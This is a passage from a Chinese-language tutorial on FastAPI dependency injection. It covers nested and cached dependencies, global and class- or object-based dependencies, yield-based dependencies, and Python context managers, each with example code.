依赖注入嵌套使用【】</h1><p>依赖注入是非常强大的，比如说，它可以<strong>支持嵌套</strong>使用，且<strong>嵌套深度不受限制</strong></p><p>示例：两层嵌套依赖注入</p><ul><li>路径函数get_name需要的形参<code>username_or_nickname</code>有依赖条件，所以FastAPI会调用 <code>username_or_nickname_extractor</code></li><li>执行<code>username_or_nickname_extractor</code>的时候，发现它也有依赖条件，所以FastAPI会调用 <code>username_extractor</code></li><li>按照这个顺序，依次获取每个有依赖条件的参数的结果。最终，在路径函数内获取最终的结果。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> typing <span class="hljs-keyword">import</span> <span class="hljs-type">Union</span><br><br><span class="hljs-keyword">from</span> fastapi <span class="hljs-keyword">import</span> Depends, FastAPI<br><br>app = FastAPI()<br><span class="hljs-comment"># 这里的Union[str, None] 函数的意思是指定多个类型中的一个，也就是说指定str类型或者None类型 Union是联合的意思</span><br><br><span class="hljs-comment"># username_extractor函数的入参是一个，</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">username_extractor</span>(<span class="hljs-params">username: <span class="hljs-type">Union</span>[<span class="hljs-built_in">str</span>, <span class="hljs-literal">None</span>] = <span class="hljs-literal">None</span></span>):<br>    <span class="hljs-keyword">return</span> username<br><br><span class="hljs-comment"># username_or_nickname_extractor这个函数的入参有两个，第一个依赖了username_extractor这个函数的入参，第二个是nickname</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">username_or_nickname_extractor</span>(<span class="hljs-params"></span><br><span class="hljs-params">    username: <span class="hljs-built_in">str</span> = Depends(<span class="hljs-params">username_extractor</span>),</span><br><span class="hljs-params">    nickname: <span class="hljs-type">Union</span>[<span class="hljs-built_in">str</span>, <span class="hljs-literal">None</span>] = <span class="hljs-literal">None</span>,</span><br><span class="hljs-params"></span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> username:<br>        <span class="hljs-keyword">return</span> nickname<br>    <span class="hljs-keyword">return</span> username<br><br><br><br><span class="hljs-comment"># 这里路径函数的入参是依赖了username_or_nickname_extractor这个函数的入参，</span><br><span class="hljs-meta">@app.get(<span class="hljs-params"><span class="hljs-string">&quot;/name&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_name</span>(<span class="hljs-params">username_or_nickname: <span class="hljs-built_in">str</span> = Depends(<span class="hljs-params">username_or_nickname_extractor</span>)</span>): <br>    <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;username_or_nickname&quot;</span>: username_or_nickname&#125;<br></code></pre></td></tr></table></figure><h1 id="7-3-依赖注入的缓存现象"><a href="#7-3-依赖注入的缓存现象" class="headerlink" title="7-3 依赖注入的缓存现象"></a>7-3 依赖注入的缓存现象</h1><p>很多时候，我们定义的依赖条件会被执行多次，这种场景下，FastAPI默认只会执行一次依赖条件。但我们也可以执行不使用缓存。</p><p>示例1：依赖注入的缓存现象</p><ul><li>依赖条件<code>get_num</code>被依赖了两次，但是你会发现其内部打印语句只打印了一次。也就是说，<strong>第二次使用这个依赖条件时FastAPI并没有真正执行这个函数，而是直接使用了第一次执行的结果，这就是依赖注入的缓存现象</strong>。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> fastapi <span class="hljs-keyword">import</span> Depends, FastAPI<br><br>app = FastAPI()<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_num</span>(<span class="hljs-params">num: <span class="hljs-built_in">int</span></span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;get_num被执行了&quot;</span>)<br>    <span class="hljs-keyword">return</span> num<br><br><br><span class="hljs-meta">@app.get(<span class="hljs-params"><span class="hljs-string">&quot;/&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_results</span>(<span class="hljs-params">num1: <span class="hljs-built_in">int</span> = Depends(<span class="hljs-params">get_num</span>), num2: <span class="hljs-built_in">int</span> = Depends(<span class="hljs-params">get_num</span>)</span>):<br>    <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;num1&quot;</span>: num1, <span class="hljs-string">&quot;num2&quot;</span>: num2&#125;<br></code></pre></td></tr></table></figure><p>实例2：依赖注入不使用缓存</p><ul><li><strong>默认 <code>use_cache</code>字段是True，如果在第二次使用依赖注入不想使用缓存，将此字段的值设为False即可</strong>。</li><li>需要注意，</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@app.get(<span class="hljs-params"><span class="hljs-string">&quot;/&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_results</span>(<span class="hljs-params">num1: <span class="hljs-built_in">int</span> = Depends(<span class="hljs-params">get_num</span>), num2: <span class="hljs-built_in">int</span> = Depends(<span class="hljs-params">get_num, use_cache=<span class="hljs-literal">False</span></span>)</span>):<br>    <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;num1&quot;</span>: num1, <span class="hljs-string">&quot;num2&quot;</span>: num2&#125;<br></code></pre></td></tr></table></figure><p>示例3：缓存现象存在缓存嵌套中</p><ul><li>依赖注入嵌套使用时，子依赖如果被使用多次也会存在缓存现象，解决办法就是第二次使用子依赖时使用use_cache&#x3D;False</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> fastapi <span class="hljs-keyword">import</span> Depends, FastAPI<br><br>app = FastAPI()<br><br><span class="hljs-comment"># 这个子依赖被使用两次</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_num</span>(<span class="hljs-params">num: <span class="hljs-built_in">int</span></span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;get_num被执行了&quot;</span>)<br>    <span class="hljs-keyword">return</span> num<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_result1</span>(<span class="hljs-params">num: <span class="hljs-built_in">int</span> = Depends(<span class="hljs-params">get_num</span>)</span>):<br>    <span class="hljs-keyword">return</span> num * num<br><br><br><span class="hljs-comment"># 第二次使用get_num时，设置use_cache=False则不使用缓存</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_result2</span>(<span class="hljs-params">num: <span class="hljs-built_in">int</span> = Depends(<span class="hljs-params">get_num, use_cache=<span class="hljs-literal">False</span></span>)</span>):<br>    <span class="hljs-keyword">return</span> num * num * num<br><br><br><span class="hljs-meta">@app.get(<span class="hljs-params"><span class="hljs-string">&quot;/&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_results</span>(<span class="hljs-params">result1: <span class="hljs-built_in">int</span> = Depends(<span class="hljs-params">get_result1</span>), result2: <span class="hljs-built_in">int</span> = Depends(<span class="hljs-params">get_result2</span>)</span>):<br>    <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;result1&quot;</span>: result1, <span class="hljs-string">&quot;result2&quot;</span>: result2&#125;<br><br></code></pre></td></tr></table></figure><p><strong>总结：</strong></p><ul><li><strong>在一个请求中，如果依赖注入条件被使用了多次，则只有第一次会真正执行内部代码，然后将其返回值缓存起来，后面再次使用它则直接获取缓存结果，不会再次执行其内部代码。</strong></li><li><strong>如果不想使用依赖注入缓存，则可以在这个依赖条件第二次被使用时，设置 <code>use_cache=False</code>即可。</strong></li></ul><h1 id="7-4-路径装饰器和全局依赖注入【有用】"><a href="#7-4-路径装饰器和全局依赖注入【有用】" class="headerlink" title="7-4 路径装饰器和全局依赖注入【有用】"></a>7-4 路径装饰器和全局依赖注入【有用】</h1><p>有的时候，我们想使用依赖注入，但并不希望它有返回值，那此时就不能在路径函数内使用<code>Depends()</code>了，那该如何呢？</p><p>不需要返回值的依赖注入，可以直接在路径装饰器中使用</p><p><strong>FastAPI的解决方式</strong></p><p>不需要返回值的依赖注入，可以在路径装饰器中使用。</p><p>示例1：使用依赖注入校验访问权限</p><ul><li>在路径装饰器中可以使用依赖注入，使用字段<code>dependencies</code>，它的值需要是一个包含<code>Depands()</code>的序列，比如列表或元组。</li><li><code>dependencies</code>中每个依赖条件不需要返回值，就是有返回值也不会使用。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> fastapi <span class="hljs-keyword">import</span> Depends, FastAPI, Header, HTTPException<br><br><br>app = FastAPI()<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">verify_token</span>(<span class="hljs-params">x_token: <span class="hljs-built_in">str</span> = Header(<span class="hljs-params"></span>)</span>):<br>    <span class="hljs-keyword">if</span> x_token != <span class="hljs-string">&quot;fake-super-secret-token&quot;</span>:<br>        <span class="hljs-keyword">raise</span> HTTPException(status_code=<span class="hljs-number">400</span>, detail=<span class="hljs-string">&quot;X-Token header invalid&quot;</span>)<br>    <span class="hljs-keyword">return</span> x_token<br><br><br><span class="hljs-meta">@app.get(<span class="hljs-params"><span class="hljs-string">&quot;/items/&quot;</span>, dependencies=[Depends(<span class="hljs-params">verify_token</span>)]</span>) </span><span class="hljs-comment"># 这个时候，在接口文档上就可以看到这条接口是需要 x_token 入参的，但是不需要返回值</span><br><span class="hljs-comment"># x_token的来源是依赖注入接口的结果verify_token</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_items</span>():<br>    <span class="hljs-keyword">return</span> [&#123;<span class="hljs-string">&quot;item&quot;</span>: <span class="hljs-string">&quot;Foo&quot;</span>&#125;, &#123;<span class="hljs-string">&quot;item&quot;</span>: <span class="hljs-string">&quot;Bar&quot;</span>&#125;]<br></code></pre></td></tr></table></figure><p>示例2：全局使用依赖注入校验访问权限</p><ul><li>如果我们希望系统中的<strong>所有路由接口都默认有依赖注入</strong>，此时我们没有<strong>必要每个接口都重复设置一遍依赖注入</strong></li><li>只需要在实例化FastAPI时，通过<code>dependencies</code>,需要注意的是，这个参数接收的值依然是一个包含多个可依赖对象的列表。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> fastapi <span class="hljs-keyword">import</span> Depends, FastAPI, Header, HTTPException<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">verify_token</span>(<span class="hljs-params">x_token: <span class="hljs-built_in">str</span> = Header(<span class="hljs-params"></span>)</span>):<br>    <span class="hljs-keyword">if</span> x_token != <span class="hljs-string">&quot;fake-super-secret-token&quot;</span>:<br>        <span class="hljs-keyword">raise</span> HTTPException(status_code=<span class="hljs-number">400</span>, detail=<span class="hljs-string">&quot;X-Token header invalid&quot;</span>)<br><br><br>app = FastAPI(dependencies=[Depends(verify_token)])<br><span class="hljs-comment"># 在实例化FastAPI的时候选择依赖注入，这样这个实例化对象的路径装饰器装饰的路径函数都会需要注入依赖</span><br><br><span class="hljs-meta">@app.get(<span class="hljs-params"><span class="hljs-string">&quot;/items/&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_items</span>():<br>    <span class="hljs-keyword">return</span> [&#123;<span class="hljs-string">&quot;item&quot;</span>: <span class="hljs-string">&quot;Portal Gun&quot;</span>&#125;, &#123;<span class="hljs-string">&quot;item&quot;</span>: <span class="hljs-string">&quot;Plumbus&quot;</span>&#125;]<br><br><br><span class="hljs-meta">@app.get(<span class="hljs-params"><span class="hljs-string">&quot;/users/&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_users</span>():<br>    <span class="hljs-keyword">return</span> [&#123;<span class="hljs-string">&quot;username&quot;</span>: <span class="hljs-string">&quot;Rick&quot;</span>&#125;, &#123;<span class="hljs-string">&quot;username&quot;</span>: <span class="hljs-string">&quot;Morty&quot;</span>&#125;]<br></code></pre></td></tr></table></figure><h1 id="7-5-基于类的依赖注入【有点用】"><a href="#7-5-基于类的依赖注入【有点用】" class="headerlink" title="7-5 基于类的依赖注入【有点用】"></a>7-5 基于类的依赖注入【有点用】</h1><p>在7-1节中，我们通过定义依赖条件，解决了通用查询参数重复定义的问题。其中，我们定义的依赖条件是普通的函数。</p><p>但其实，只要是可调用的对象，都可以当做依赖条件，比如类。<strong>类实例化其实就是类的调用</strong>。</p><p>示例1：类形式的依赖条件</p><ul><li><code>CommonQueryParams()</code>就会实例化出来一个对象，三个通用参数就会保存在在对象的三个属性上。</li><li>类中定义的<code>__init__</code>方法，用来保存变量属性。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> fastapi <span class="hljs-keyword">import</span> Depends, FastAPI<br><br>app = FastAPI()<br><br><br>BOOKS = [&#123;<span class="hljs-string">&quot;id&quot;</span>: i, <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">f&quot;book<span class="hljs-subst">&#123;i&#125;</span>&quot;</span>, <span class="hljs-string">&quot;status&quot;</span>: i % <span class="hljs-number">4</span> != <span class="hljs-number">0</span>&#125; <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">11</span>)]<br><br><br><span class="hljs-comment"># 定义依赖条件</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">CommonQueryParams</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, page: <span class="hljs-built_in">int</span>, size: <span class="hljs-built_in">int</span>, status: <span class="hljs-built_in">bool</span></span>):<br>        self.page = page<br>        self.size = size<br>        self.status = status<br><br><br><span class="hljs-meta">@app.get(<span class="hljs-params"><span class="hljs-string">&quot;/api/books&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_books</span>(<span class="hljs-params">commons: CommonQueryParams = Depends(<span class="hljs-params">CommonQueryParams</span>)</span>):    <span class="hljs-comment"># 使用依赖条件 </span><br><span class="hljs-comment"># 这里 CommonQueryParams类的init属性就是入参依赖，</span><br><br>    page = commons.page<br>    size = commons.size<br>    books = [b <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> BOOKS <span class="hljs-keyword">if</span> b[<span class="hljs-string">&quot;status&quot;</span>] == commons.status]<br>    <span class="hljs-keyword">return</span> books[(page - <span class="hljs-number">1</span>) * size:page * size]<br></code></pre></td></tr></table></figure><p>示例2：<strong>类形式依赖注入的简化用法</strong></p><ul><li>上面我们使用类形式的依赖注入，看起来优点冗余对吧：<code>commons: CommonQueryParams = Depends(CommonQueryParams)</code></li><li>对于这种情况，有一个简写方式：<code>commons: CommonQueryParams = Depends()</code>，此时fastapi知道Depends括号内依赖的是什么。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 定义依赖条件</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">CommonQueryParams</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, page: <span class="hljs-built_in">int</span>, size: <span class="hljs-built_in">int</span>, status: <span class="hljs-built_in">bool</span></span>):<br>        self.page = page<br>        self.size = size<br>        self.status = status<br><br><br><span class="hljs-meta">@app.get(<span class="hljs-params"><span class="hljs-string">&quot;/api/books&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_books</span>(<span class="hljs-params">commons: CommonQueryParams = Depends(<span class="hljs-params"></span>)</span>): <span class="hljs-comment">#简单一点写就是直接类的实例化对象，CommonQueryParams = Depends()就是在实例化这个类</span><br>    <span class="hljs-keyword">pass</span><br></code></pre></td></tr></table></figure><h1 id="7-6-基于对象的依赖注入【常用】"><a href="#7-6-基于对象的依赖注入【常用】" class="headerlink" title="7-6 基于对象的依赖注入【常用】"></a>7-6 基于对象的依赖注入【常用】</h1><p>上面我们可以定义基于函数，或者基于类形式的依赖条件，但是他们有一个共同的缺点：<strong>写死不可变的，不支持参数化</strong>。</p><p>比如，我们有一个需求，要<strong>求我们检查查询参数中</strong>的字段是否包含指定的文本，并且被检查的文本可以通过参数的形式调整。</p><p>示例1：检查指定的文本是否在查询参数q中</p><ul><li>缺点：代码重复，不够灵活优雅</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> fastapi <span class="hljs-keyword">import</span>  FastAPI<br><br>app = FastAPI()<br><br><br><span class="hljs-meta">@app.get(<span class="hljs-params"><span class="hljs-string">&quot;/hello&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">hello_check</span>(<span class="hljs-params">q: <span class="hljs-built_in">str</span></span>):<br>    exists = <span class="hljs-string">&quot;hello&quot;</span> <span class="hljs-keyword">in</span> q<br>    <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;exists&quot;</span>: exists&#125;<br><br><br><span class="hljs-meta">@app.get(<span class="hljs-params"><span class="hljs-string">&quot;/world&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">world_check</span>(<span class="hljs-params">q: <span class="hljs-built_in">str</span></span>): <span class="hljs-comment"># 入参是q 判断q包不包含world ，包含就返回ture,否这flase</span><br>    exists = <span class="hljs-string">&quot;world&quot;</span> <span class="hljs-keyword">in</span> q<br>    <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;exists&quot;</span>: exists&#125;<br></code></pre></td></tr></table></figure><p><strong>FastAPI的解决方式</strong></p><p>对于上面的的需求，我们可以使用基于对象的依赖注入，只要在类下面实现<code>__call__</code>方法，该对象就可以被调用，基于可以当做依赖条件</p><p>示例2：基于对象的依赖条件，参数化</p><ul><li>对象<code>FixedContentQueryChecker(&quot;hello&quot;)</code>当依赖条件，它被调用时就会执行其魔法方法<code>__call__</code>，就会判断查询参数q中是否包含待检查的文本信息。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> fastapi <span class="hljs-keyword">import</span> Depends, FastAPI<br><br>app = FastAPI()<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">FixedContentQueryChecker</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, fixed_content: <span class="hljs-built_in">str</span></span>):     <span class="hljs-comment"># 实例化对象是执行</span><br>        self.fixed_content = fixed_content<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__call__</span>(<span class="hljs-params">self, q: <span class="hljs-built_in">str</span> = <span class="hljs-string">&quot;&quot;</span></span>) -&gt; <span class="hljs-built_in">bool</span>:    <span class="hljs-comment"># 对象被调用时执行</span><br>        <span class="hljs-keyword">return</span> self.fixed_content <span class="hljs-keyword">in</span> q<br><br><span class="hljs-comment"># FixedContentQueryChecker(&quot;hello&quot;)是在将类当方法调用，此时就会触发类的call方法</span><br><span class="hljs-meta">@app.get(<span class="hljs-params"><span class="hljs-string">&quot;/hello&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">hello_check</span>(<span class="hljs-params">exists: <span class="hljs-built_in">bool</span> = Depends(<span class="hljs-params">FixedContentQueryChecker(<span class="hljs-params"><span class="hljs-string">&quot;hello&quot;</span></span>)</span>)</span>):<br>    <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;exists&quot;</span>: exists&#125;<br><br><br><span class="hljs-meta">@app.get(<span class="hljs-params"><span class="hljs-string">&quot;/world&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">world_check</span>(<span class="hljs-params">exists: <span class="hljs-built_in">bool</span> = Depends(<span class="hljs-params">FixedContentQueryChecker(<span class="hljs-params"><span class="hljs-string">&quot;world&quot;</span></span>)</span>)</span>):<br>    <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;exists&quot;</span>: exists&#125;<br></code></pre></td></tr></table></figure><p>这里复习一下python魔法方法call </p><ul><li>类中的call在对象被调用时出发。就是当对象加括号被调用时触发</li><li>对象或者变量，只有实现了call方法，才是可调用对象，才可以被执行，否则就会报错， object is not callable</li><li>定义了call后，你实例化的对象可以像函数一样被调用，</li></ul><h1 id="7-7-依赖注入使用yield【好玩】"><a href="#7-7-依赖注入使用yield【好玩】" class="headerlink" title="7-7 依赖注入使用yield【好玩】"></a>7-7 依赖注入使用yield【好玩】</h1><ul><li>fastapi的依赖注入非常强大，它还可以具备上下文管理器的功能。</li><li>想要在依赖注入中实现上下文管理器，我们可以使用 <code>yield</code></li><li>比如，我们想要在进入路径操作函数时通过依赖获取一个操作数据库的连接，请求结束后关闭这个db连接</li></ul><p>示例1：依赖注入中使用yield</p><ul><li>这样写的好处是，在路径操作函数结束时，会自动关闭db连接回收资源。及时在路径函数会出现异常报错，最终也会关闭连接。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> fastapi <span class="hljs-keyword">import</span> Depends, FastAPI<br><br><br>app = FastAPI()<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_db</span>():<br>    db = DBSession()<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">yield</span> db<br>    <span class="hljs-keyword">finally</span>:<br>        db.close()<br><br><br><span class="hljs-meta">@app.get(<span class="hljs-params"><span class="hljs-string">&quot;/books/&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">books</span>(<span class="hljs-params">db: Depend(<span class="hljs-params">get_db</span>)</span>): <span class="hljs-comment"># 和pytest的fixture类似使用，yield函数就是迭代器</span><br>    <span class="hljs-comment"># db.execute(&quot;select * form books&quot;)   db操作</span><br>    <span class="hljs-keyword">pass</span><br></code></pre></td></tr></table></figure><h1 id="7-8-回忆补充上下文管理器【重要】"><a href="#7-8-回忆补充上下文管理器【重要】" class="headerlink" title="7-8 回忆补充上下文管理器【重要】"></a>7-8 回忆补充上下文管理器【重要】</h1><p><strong>上下文管理器 是什么？</strong></p><ul><li>是一种用于管理资源的<strong>机制</strong></li><li>它提供了一种方便的方式来<strong>自动获取和释放资源</strong>，确保资源在使用完毕后被<strong>正确的释放</strong>，<strong>无论是正常执行还是发生异常</strong>，都能<strong>正确释放</strong></li></ul><p><strong>上下文管理协议需要实现两个功能</strong>：</p><ul><li><code>__enter__</code>，进入上下文时运行，并返回当前对象。如果with语句有as关键词存在，返回值会绑定在as后的变量上。</li><li><code>__exit__</code>，退出上下文时运行</li></ul><p>上下文管理器中的 <code>with</code>, 它的一个常见使用场景如下：</p><ul><li>open函数会返回一个文件类型变量，这个文件类实现了上下文管理协议，而with语句就是为支持上下文管理器而存在的。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;test.txt&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> f:  <span class="hljs-comment"># open()返回的就是一个上下文管理器</span><br>    content = f.read()<br></code></pre></td></tr></table></figure><ul><li>进入with语句块时，就会执行文件类的<code>__enter__</code>返回一个文件对象，并赋值给变量 <code>f</code></li><li>从with语句块出来时，机会执行文件类的<code>__exit__</code>，在其内部实现 <strong>f.close()<strong>，所以</strong>使用者就不需要在手动关闭文件对象</strong>了。</li></ul><p>示例1：手动封装实现类似于open()的上下文管理器</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyFile</span>():<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self,name</span>):<br>        self.name = name<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__enter__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;进入with......&quot;</span>)<br>        <span class="hljs-keyword">return</span> self   <span class="hljs-comment"># 返回的数据复制给下面的p</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__exit__</span>(<span class="hljs-params">self， exc_type, exc_val, exc_tb</span>): <br>        <span class="hljs-comment"># exc_type表示异常类型，exc_val表示异常值，exc_tb表示异常回调 是默认要填的</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;退出with=====&quot;</span>)<br>        <br><span class="hljs-keyword">with</span> MyFile(<span class="hljs-string">&#x27;Tom&#x27;</span>) <span class="hljs-keyword">as</span> p:  <span class="hljs-comment"># MyFile（ ）返回的也是一个上下文管理器</span><br>    <span class="hljs-built_in">print</span>(p.name)  <br><span class="hljs-comment"># 执行的结果是</span><br><span class="hljs-comment"># 进入with......</span><br><span class="hljs-comment"># Tom</span><br><span class="hljs-comment"># 退出with=====</span><br></code></pre></td></tr></table></figure><p>示例2：contextlib 模块实现上下文管理器【拓展】</p><ul><li>使用装饰器 contextmanager</li><li>get_file函数内部，yield语句前的代码在进入with语句时执行，yield的值赋值给 as后面的变量，</li><li>yield后面的代码在退出with语句时执行</li></ul><figure class="highlight 